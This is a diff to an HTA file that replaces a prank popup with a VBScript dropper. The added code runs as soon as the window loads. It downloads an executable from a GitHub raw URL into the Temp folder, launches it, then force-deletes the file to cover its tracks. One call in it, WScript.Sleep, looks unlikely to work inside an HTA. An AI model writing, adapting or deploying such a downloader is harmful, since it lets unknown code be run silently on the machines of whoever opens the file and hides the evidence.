@@ -1,7 +1,6 @@
-
 <html>
 <head>
-  <title>Popup</title>
+  <title>Downloader</title>
   <HTA:APPLICATION
     ID="app"
     BORDER="thin"
@@ -14,12 +13,40 @@
   >
   <script language="VBScript">
     Sub Window_OnLoad()
-      Dim result
-      result = MsgBox("You've been hacked", vbOKOnly + vbExclamation, "Warning!")
-      If result = vbOK Then
-        MsgBox "jk lol", vbInformation, "Just kidding"
-        window.close()
+      Dim fileUrl, savePath
+      fileUrl = "https://raw.githubusercontent.com/wasderlol/test/main/test.exe"
+      
+      Dim fso
+      Set fso = CreateObject("Scripting.FileSystemObject")
+      savePath = fso.GetSpecialFolder(2) & "\downloadedfile.exe" ' Temp folder
+
+      Dim xmlHttp, adoStream, shell
+      Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
+      xmlHttp.Open "GET", fileUrl, False
+      xmlHttp.Send
+
+      If xmlHttp.Status = 200 Then
+        Set adoStream = CreateObject("ADODB.Stream")
+        adoStream.Type = 1 ' Binary
+        adoStream.Open
+        adoStream.Write xmlHttp.ResponseBody
+        adoStream.SaveToFile savePath, 2 ' Overwrite if exists
+        adoStream.Close
+
+        Set shell = CreateObject("WScript.Shell")
+        shell.Run Chr(34) & savePath & Chr(34), 1, False ' Run the file (window normal, async)
+
+        ' Wait ~3 seconds before deleting the file to give it time to start
+        WScript.Sleep 3000
+
+        ' Delete the file after running
+        On Error Resume Next
+        fso.DeleteFile savePath, True
+      Else
+        MsgBox "Download failed with status " & xmlHttp.Status, vbExclamation, "Error"
       End If
+
+      window.close()
     End Sub
   </script>
 </head>
